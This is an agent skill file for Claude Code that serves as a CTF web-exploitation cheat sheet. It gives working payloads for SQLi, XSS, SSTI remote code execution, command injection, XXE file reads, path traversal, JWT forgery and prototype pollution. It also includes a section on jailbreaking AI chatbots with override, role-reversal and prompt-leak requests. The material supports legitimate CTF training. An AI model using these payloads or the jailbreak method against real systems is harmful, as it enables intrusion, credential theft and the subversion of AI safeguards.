---
name: ctf-web
description: Provides web exploitation techniques for CTF challenges. Use when solving web security challenges involving XSS, SQLi, SSTI, SSRF, CSRF, XXE, file upload bypasses, JWT attacks, prototype pollution, path traversal, command injection, LaTeX injection, request smuggling, DOM clobbering, Web3/blockchain, authentication bypass, SAML exploitation, OAuth/OIDC, open redirect chains, subdomain takeover, or CI/CD credential theft.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Web Exploitation

Quick reference for web CTF challenges. Each technique has a one-liner here; see supporting files for full details with payloads and code.

## Additional Resources

- [server-side.md](server-side.md) - Core server-side injection attacks: SQLi, SSTI, SSRF (Host header, DNS rebinding), XXE, command injection, LaTeX injection RCE, code injection (Ruby/Perl/Python), ReDoS, file upload→RCE, eval bypass, PHP type juggling, PHP file inclusion / php://filter, SSTI `__dict__.update()` quote bypass, ERB SSTI Sequel bypass, Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF bypass
- [server-side-advanced.md](server-side-advanced.md) - Advanced server-side techniques: ExifTool CVE-2021-22204, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses (brace stripping, double URL encoding, os.path.join, %2f), Flask/Werkzeug debug mode, XXE external DTD filter bypass, WeasyPrint SSRF, MongoDB regex injection, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE (CVE-2025-55182), SSRF→Docker API RCE chain, Castor XML xsi:type deserialization (Atlas HTB), Apache ErrorDocument expression file read (Zero HTB)
- [client-side.md](client-side.md) - Client-side attacks: XSS, CSRF, CSPT, cache poisoning, DOM tricks, React input filling, hidden elements, XS-Leak timing oracle, GraphQL CSRF, Unicode case folding XSS bypass (long-s U+017F), CSS font glyph container query exfiltration, Hyperscript CDN CSP bypass, PBKDF2 prefix timing oracle
- [auth-and-access.md](auth-and-access.md) - Auth/authz attacks: password inference, weak validation, client-side gates, NoSQL auth bypass, HAProxy/Express.js bypass, IDOR on WIP endpoints, HTTP TRACE method bypass, LLM/AI chatbot jailbreak, open redirect chains (OAuth token theft), subdomain takeover
- [auth-jwt.md](auth-jwt.md) - JWT/JWE token attacks: algorithm none, RS256→HS256 confusion, weak secret, unverified signature, JWK/JKU header injection, KID path traversal, balance replay, JWE forgery with exposed public key
- [auth-infra.md](auth-infra.md) - Infrastructure auth: OAuth/OIDC exploitation (redirect_uri bypass, token manipulation, state CSRF), CORS misconfiguration, git history credential leakage, CI/CD variable theft, identity provider API takeover (authentik/Keycloak), SAML SSO flow automation, Guacamole parameter extraction, login page poisoning, TeamCity REST API RCE
- [node-and-prototype.md](node-and-prototype.md) - Node.js: prototype pollution, VM sandbox escape, Happy-DOM chain, flatnest CVE, Lodash+Pug AST injection
- [web3.md](web3.md) - Blockchain/Web3: Solidity exploits, proxy patterns, ABI encoding tricks, transient storage clearing collision (0.8.28-0.8.33), Foundry tooling
- [cves.md](cves.md) - CVE-specific exploits: Next.js middleware bypass, curl credential leak, Uvicorn CRLF, urllib scheme bypass, ExifTool DjVu, broken auth, AAEncode/JJEncode, protocol multiplexing, React Server Components Flight RCE (CVE-2025-55182), Ruby-SAML XPath digest smuggling (CVE-2024-45409, Barrier HTB), PaperCut NG auth bypass + RCE (CVE-2023-27350, Bamboo HTB), Zabbix blind SQLi (CVE-2024-22120, Watcher HTB)

---

## Reconnaissance

- View source for HTML comments, check JS/CSS files for internal APIs
- Look for `.map` source map files
- Check response headers for custom X- headers and auth hints
- Common paths: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/api`, `/debug`, `/.git/`, `/.env`
- Search JS bundles: `grep -oE '"/api/[^"]+"'` for hidden endpoints
- Check for client-side validation that can be bypassed
- Compare what the UI sends vs. what the API accepts (read JS bundle for all fields)
- Check assets returning 404 status — `favicon.ico`, `robots.txt` may contain data despite error codes: `strings favicon.ico | grep -i flag`
- Tor hidden services: `feroxbuster -u 'http://target.onion/' -w wordlist.txt --proxy socks5h://127.0.0.1:9050 -t 10 -x .txt,.html,.bak`

## SQL Injection Quick Reference

**Detection:** Send `'` — syntax error indicates SQLi

```sql
' OR '1'='1                    # Classic auth bypass
' OR 1=1--                     # Comment termination
username=\&password= OR 1=1--  # Backslash escape quote bypass
' UNION SELECT sql,2,3 FROM sqlite_master--  # SQLite schema
0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
```

XML entity encoding: `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` → `UNION` after XML parser decodes, bypasses WAF keyword filters.

See [server-side.md](server-side.md) for second-order SQLi, LIKE brute-force, SQLi→SSTI chains, XML entity WAF bypass.

## XSS Quick Reference

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Filter bypass: hex `\x3cscript\x3e`, entities `&#60;script&#62;`, case mixing `<ScRiPt>`, event handlers.

See [client-side.md](client-side.md) for DOMPurify bypass, cache poisoning, CSPT, React input tricks.

## Path Traversal / LFI Quick Reference

```text
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**Python footgun:** `os.path.join('/app/public', '/etc/passwd')` returns `/etc/passwd`

## JWT Quick Reference

1. `alg: none` — remove signature entirely
2. Algorithm confusion (RS256→HS256) — sign with public key
3. Weak secret — brute force with hashcat/flask-unsign
4. Key exposure — check `/api/getPublicKey`, `.env`, `/debug/config`
5. Balance replay — save JWT, spend, replay old JWT, return items for profit
6. Unverified signature — modify payload, keep original signature
7. JWK header injection — embed attacker public key in token header
8. JKU header injection — point to attacker-controlled JWKS URL
9. KID path traversal — `../../../dev/null` for empty key, or SQL injection in KID

See [auth-jwt.md](auth-jwt.md) for full JWT/JWE attacks and session manipulation.

## SSTI Quick Reference

**Detection:** `{{7*7}}` returns `49`

```python
# Jinja2 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Go template
{{.ReadFile "/flag.txt"}}
# EJS
<%- global.process.mainModule.require('child_process').execSync('id') %>
# Jinja2 quote bypass (keyword args):
{{obj.__dict__.update(attr=value) or obj.name}}
```

**Mako SSTI (Python):** `${__import__('os').popen('id').read()}` — no sandbox, plain Python inside `${}` or `<% %>`. **Twig SSTI (PHP):** `{{['id']|map('system')|join}}` — distinguish from Jinja2 via `{{7*'7'}}` (Twig repeats string, Jinja2 returns 49). See [server-side.md](server-side.md#mako-ssti) and [server-side.md](server-side.md#twig-ssti).

**Quote filter bypass:** Use `__dict__.update(key=value)` — keyword arguments need no quotes. See [server-side.md](server-side.md#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026).

**ERB SSTI (Ruby/Sinatra):** `<%= Sequel::DATABASES.first[:table].all %>` bypasses ERBSandbox variable-name restrictions via the global `Sequel::DATABASES` array. See [server-side.md](server-side.md#erb-ssti--sequeldatabases-bypass-bearcatctf-2026).

**Thymeleaf SpEL SSTI (Java/Spring):** `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}` reads files via Spring utility classes when standard I/O is WAF-blocked. Works in distroless containers (no shell). See [server-side.md](server-side.md#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026).

## SSRF Quick Reference

```text
127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
127.0.0.1.nip.io, 2130706433, 0x7f000001
```

DNS rebinding for TOCTOU: https://lock.cmpxchg8b.com/rebinder.html

**Host header SSRF:** Server builds internal request URL from `Host` header (e.g., `http.Get("http://" + request.Host + "/validate")`). Set Host to attacker domain → validation request goes to attacker server. See [server-side.md](server-side.md#host-header-ssrf-mireactf).

## Command Injection Quick Reference

```bash
; id          | id          `id`          $(id)
%0aid         # Newline     127.0.0.1%0acat /flag
```

When cat/head blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`

## XXE Quick Reference

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

PHP filter: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">`

## PHP Type Juggling Quick Reference

Loose `==` performs type coercion: `0 == "string"` is `true`, `"0e123" == "0e456"` is `true` (magic hashes). Send JSON integer `0` to bypass string password checks. `strcmp([], "str")` returns `NULL` which passes `!strcmp()`. Use `===` for defense.

See [server-side.md](server-side.md#php-type-juggling) for comparison table and exploit payloads.

## PHP File Inclusion / LFI Quick Reference

`php://filter/convert.base64-encode/resource=config` leaks PHP source code without execution. Common LFI targets: `/etc/passwd`, `/proc/self/environ`, app config files. Null byte (`%00`) truncates `.php` suffix on PHP < 5.3.4.

See [server-side.md](server-side.md#php-file-inclusion--phpfilter) for filter chains and RCE techniques.

## Code Injection Quick Reference

**Ruby `instance_eval`:** Break string + comment: `VALID');INJECTED_CODE#`
**Perl `open()`:** 2-arg open allows pipe: `|command|`
**JS `eval` blocklist bypass:** `row['con'+'structor']['con'+'structor']('return this')()`
**PHP deserialization:** Craft serialized object in cookie → LFI/RCE
**LaTeX injection:** `\input{|"cat /flag.txt"}` — shell command via pipe syntax in PDF generation services. `\@@input"/etc/passwd"` for file reads without shell.

See [server-side.md](server-side.md) for full payloads and bypass techniques.

## Node.js Quick Reference

**Prototype pollution:** `{"__proto__": {"isAdmin": true}}` or flatnest circular ref bypass
**VM escape:** `this.constructor.constructor("return process")()` → RCE
**Full chain:** pollution → enable JS eval in Happy-DOM → VM escape → RCE

**Prototype pollution permission bypass (Server OC, Pragyan 2026):**
```bash
# When Express.js endpoint checks req.body.isAdmin or similar:
curl -X POST -H 'Content-Type: application/json' \
  -d '{"Path":"value","__proto__":{"isAdmin":true}}' \
  'https://target/endpoint'
# __proto__ pollutes Object.prototype, making isAdmin truthy on all objects
```
**Key insight:** Always try `__proto__` injection on JSON endpoints, even when the vulnerability seems like something else (race condition, SSRF, etc.).

See [node-and-prototype.md](node-and-prototype.md) for detailed exploitation.

## Auth & Access Control Quick Reference

- Cookie manipulation: `role=admin`, `isAdmin=true`
- Public admin-login cookie seeding: check if `/admin/login` sets reusable admin session cookie
- Host header bypass: `Host: 127.0.0.1`
- Hidden endpoints: search JS bundles for `/api/internal/`, `/api/admin/`; fuzz with auth cookie for non-`/api` routes like `/internal/*`
- Client-side gates: `window.overrideAccess = true` or call API directly
- Password inference: profile data + structured ID format → brute-force
- Weak signature: check if only first N chars of hash are validated
- Affine cipher OTP: only 312 possible values (`12 mults × 26 adds`), brute-force all in seconds
- Express.js `%2F` middleware bypass: `/api/export%2Fchat` skips `app.all("/api/export/chat")` middleware; nginx decodes `%2F` before proxying
- IDOR on WIP endpoints: grep for `WIP`/`TODO`/`debug` comments, compare auth decorators against production endpoints
- Git history credential leakage: `git log -p --all -S "password"` finds deleted secrets
- CI/CD variable theft: GitLab/Jenkins/GitHub CI/CD variables store service account tokens
- Identity provider API takeover: admin token → set any user's password, bypass MFA with `not_configured_action: skip`
- SAML SSO automation: preserve `RelayState` through entire flow, submit signed `SAMLResponse` to callback
- Guacamole parameter extraction: API token or MySQL access exposes SSH keys and passphrases
- Login page poisoning: inject credential logger into login page, harvest automated logins from `/dev/shm/creds.txt`
- TeamCity REST API RCE: admin creds → create project → add build step → trigger build (runs as build agent user, often root)

## Open Redirect Chains
Chain open redirects (`?redirect=`, `?next=`, `?url=`) with OAuth flows for token theft. Bypass validation with `@`, `%00`, `//`, `\`, CRLF. See [auth-and-access.md](auth-and-access.md#open-redirect-chains).

## Subdomain Takeover
Dangling CNAME → claim resource on external service (GitHub Pages, S3, Heroku). Use `subfinder` + `httpx` to enumerate, check fingerprints. See [auth-and-access.md](auth-and-access.md#subdomain-takeover).

See [auth-and-access.md](auth-and-access.md) for access control bypasses, [auth-jwt.md](auth-jwt.md) for JWT/JWE attacks, and [auth-infra.md](auth-infra.md) for OAuth/SAML/CI-CD/infrastructure auth.

## File Upload → RCE

- `.htaccess` upload: `AddType application/x-httpd-php .lol` + webshell
- Gogs symlink: overwrite `.git/config` with `core.sshCommand` RCE
- Python `.so` hijack: write malicious shared object + delete `.pyc` to force reimport
- ZipSlip: symlink in zip for file read, path traversal for file write
- Log poisoning: PHP payload in User-Agent + path traversal to include log

See [server-side.md](server-side.md) for detailed steps.

## Multi-Stage Chain Patterns

**0xClinic chain:** Password inference → path traversal + ReDoS oracle (leak secrets from `/proc/1/environ`) → CRLF injection (CSP bypass + cache poisoning + XSS) → urllib scheme bypass (SSRF) → `.so` write via path traversal → RCE

**Key chaining insights:**
- Path traversal + any file-reading primitive → leak `/proc/*/environ`, `/proc/*/cmdline`
- CRLF in headers → CSP bypass + cache poisoning + XSS in one shot
- Arbitrary file write in Python → `.so` hijacking or `.pyc` overwrite for RCE
- Lowercased response body → use hex escapes (`\x3c` for `<`)

## Useful Tools

```bash
sqlmap -u "http://target/?id=1" --dbs       # SQLi
ffuf -u http://target/FUZZ -w wordlist.txt   # Directory fuzzing
flask-unsign --decode --cookie "eyJ..."      # JWT decode
hashcat -m 16500 jwt.txt wordlist.txt        # JWT crack
dalfox url http://target/?q=test             # XSS
```

## Flask/Werkzeug Debug Mode

Weak session secret brute-force + forge admin session + Werkzeug debugger PIN RCE. See [server-side-advanced.md](server-side-advanced.md#flaskwerkzeug-debug-mode-exploitation) for full attack chain.

## XXE with External DTD Filter Bypass

Host malicious DTD externally to bypass upload keyword filters. See [server-side-advanced.md](server-side-advanced.md#xxe-with-external-dtd-filter-bypass) for payload and webhook.site setup.

## JSFuck Decoding

Remove trailing `()()`, eval in Node.js, `.toString()` reveals original code. See [client-side.md](client-side.md#jsfuck-decoding).

## DOM XSS via jQuery Hashchange (Crypto-Cat)

`$(location.hash)` + `hashchange` event → XSS via iframe: `<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">`. See [client-side.md](client-side.md#dom-xss-via-jquery-hashchange-crypto-cat).

## Shadow DOM XSS

Proxy `attachShadow` to capture closed roots; `(0,eval)` for scope escape; `</script>` injection. See [client-side.md](client-side.md#shadow-dom-xss).

## DOM Clobbering + MIME Mismatch

`.jpg` served as `text/html`; `<form id="config">` clobbers JS globals. See [client-side.md](client-side.md#dom-clobbering-mime-mismatch-pragyan-2026).

## HTTP Request Smuggling via Cache Proxy

Cache proxy desync for cookie theft via incomplete POST body. See [client-side.md](client-side.md#http-request-smuggling-via-cache-proxy).

## Path Traversal: URL-Encoded Slash Bypass

`%2f` bypasses nginx route matching but filesystem resolves it. See [server-side-advanced.md](server-side-advanced.md#path-traversal-url-encoded-slash-bypass).

## WeasyPrint SSRF & File Read (CVE-2024-28184)

`<a rel="attachment" href="file:///flag.txt">` or `<link rel="attachment" href="http://127.0.0.1/admin">` -- WeasyPrint embeds fetched content as PDF attachments, bypassing header checks. Boolean oracle via `/Type /EmbeddedFile` presence. See [server-side-advanced.md](server-side-advanced.md#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026) and [cves.md](cves.md#cve-2024-28184-weasyprint-attachment-ssrf--file-read).

## MongoDB Regex / $where Blind Injection

Break out of `/.../i` with `a^/)||(<condition>)&&(/a^`. Binary search `charCodeAt()` for extraction. See [server-side-advanced.md](server-side-advanced.md#mongodb-regex-injection--where-blind-oracle-nullcon-2026).

## Pongo2 / Go Template Injection

`{% include "/flag.txt" %}` in uploaded file + path traversal in template parameter. See [server-side-advanced.md](server-side-advanced.md#pongo2--go-template-injection-via-path-traversal-nullcon-2026).

## ZIP Upload with PHP Webshell

Upload ZIP containing `.php` file → extract to web-accessible dir → `file_get_contents('/flag.txt')`. See [server-side-advanced.md](server-side-advanced.md#zip-upload-with-php-webshell-nullcon-2026).

## basename() Bypass for Hidden Files

`basename()` only strips dirs, doesn't filter `.lock` or hidden files in same directory. See [server-side-advanced.md](server-side-advanced.md#basename-bypass-for-hidden-files-nullcon-2026).

## Custom Linear MAC Forgery

Linear XOR-based signing with secret blocks → recover from known pairs → forge for target. See [auth-and-access.md](auth-and-access.md#custom-linear-macsignature-forgery-nullcon-2026).

## CSS/JS Paywall Bypass

Content behind CSS overlay (`position: fixed; z-index: 99999`) is still in the raw HTML. `curl` or view-source bypasses it instantly. See [client-side.md](client-side.md#cssjs-paywall-bypass).

## SSRF → Docker API RCE Chain

SSRF to unauthenticated Docker daemon on port 2375. Use `/archive` for file extraction, `/exec` + `/exec/{id}/start` for command execution. Chain through internal POST relay when SSRF is GET-only. See [server-side-advanced.md](server-side-advanced.md#ssrf--docker-api-rce-chain-h7ctf-2025).

## Castor XML Deserialization via xsi:type (Atlas HTB)

Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes for arbitrary Java class instantiation. Chain through JNDI (Java Naming and Directory Interface) / RMI (Remote Method Invocation) via ysoserial `CommonsBeanutils1` for RCE. Requires Java 11 (not 17+). Check `pom.xml` for `castor-xml`. See [server-side-advanced.md](server-side-advanced.md#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb).

## Apache ErrorDocument Expression File Read (Zero HTB)

`.htaccess` with `ErrorDocument 404 "%{file:/etc/passwd}"` reads files at Apache level, bypassing `php_admin_flag engine off`. Requires `AllowOverride FileInfo`. Upload via SFTP, trigger with 404 request. See [server-side-advanced.md](server-side-advanced.md#apache-errordocument-expression-file-read-zero-htb).

## HTTP TRACE Method Bypass

Endpoints returning 403 on GET/POST may respond to TRACE, PUT, PATCH, or DELETE. Test with `curl -X TRACE`. See [auth-and-access.md](auth-and-access.md#http-trace-method-bypass-bypass-ctf-2025).

## LLM/AI Chatbot Jailbreak

AI chatbots guarding flags can be bypassed with system override prompts, role-reversal, or instruction leak requests. Rotate session IDs and escalate prompt severity. See [auth-and-access.md](auth-and-access.md#llmai-chatbot-jailbreak-bypass-ctf-2025).

## Admin Bot javascript: URL Scheme Bypass

`new URL()` validates syntax only, not protocol — `javascript:` URLs pass and execute in Puppeteer's authenticated context. CSP/SRI on the target page are irrelevant since JS runs in navigation context. See [client-side.md](client-side.md#admin-bot-javascript-url-scheme-bypass-dicectf-2026).

## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)

HTML injection → meta refresh redirect (CSP bypass) → admin bot loads attacker page → JavaScript makes cross-origin GET requests to `localhost` GraphQL endpoint via `new Image().src` → measures time-based SQLi (`SLEEP(1)`) through image error timing → character-by-character flag exfiltration. GraphQL GET requests bypass CORS preflight. See [client-side.md](client-side.md#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty).

## React Server Components Flight Protocol RCE (Ehax 2026)

Identify via `Next-Action` + `Accept: text/x-component` headers. CVE-2025-55182: fake Flight chunk exploits constructor chain for server-side JS execution. Exfiltrate via `NEXT_REDIRECT` error → `x-action-redirect` header. WAF bypass: `'chi'+'ld_pro'+'cess'` or hex `'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'`. See [server-side-advanced.md](server-side-advanced.md#react-server-components-flight-protocol-rce-ehax-2026) and [cves.md](cves.md#cve-2025-55182--cve-2025-66478-react-server-components-flight-protocol-rce).

## Unicode Case Folding XSS Bypass (UNbreakable 2026)

**Pattern:** Sanitizer regex uses ASCII-only matching (`<\s*script`), but downstream processing applies Unicode case folding (`strings.EqualFold`). `<ſcript>` (U+017F Latin Long S) bypasses regex but folds to `<script>`. Other pairs: `ı`→`i`, `K` (U+212A)→`k`. See [client-side.md](client-side.md#unicode-case-folding-xss-bypass-unbreakable-2026).

## CSS Font Glyph + Container Query Data Exfiltration (UNbreakable 2026)

**Pattern:** Exfiltrate inline text via CSS injection (no JS). Custom font assigns unique glyph widths per character. Container queries match width ranges to fire background-image requests — one request per character. Works under strict CSP. See [client-side.md](client-side.md#css-font-glyph-width--container-query-exfiltration-unbreakable-2026).

## Hyperscript / Alpine.js CDN CSP Bypass (UNbreakable 2026)

**Pattern:** CSP allows `cdnjs.cloudflare.com`. Load Hyperscript (`_=` attributes) or Alpine.js (`x-data`, `x-init`) from CDN — they execute code from HTML attributes that sanitizers don't strip. See [client-side.md](client-side.md#hyperscript-cdn-csp-bypass-unbreakable-2026).

## Solidity Transient Storage Clearing Collision (0.8.28-0.8.33)

**Pattern:** Solidity IR pipeline (`--via-ir`) generates identically-named Yul helpers for `delete` on persistent and transient variables of the same type. One uses `sstore`, the other should use `tstore`, but deduplication picks only one. Exploits: overwrite `owner` (slot 0) via transient `delete`, or make persistent `delete` (revoke approvals) ineffective. Workaround: use `_lock = address(0)` instead of `delete _lock`. See [web3.md](web3.md#solidity-transient-storage-clearing-helper-collision-solidity-0828-0833).

## Common Flag Locations

```text
/flag.txt, /flag, /app/flag.txt, /home/*/flag*
Environment variables: /proc/self/environ
Database: flag, flags, secret tables
Response headers: x-flag, x-archive-tag, x-proof
Hidden DOM: display:none elements, data attributes
```
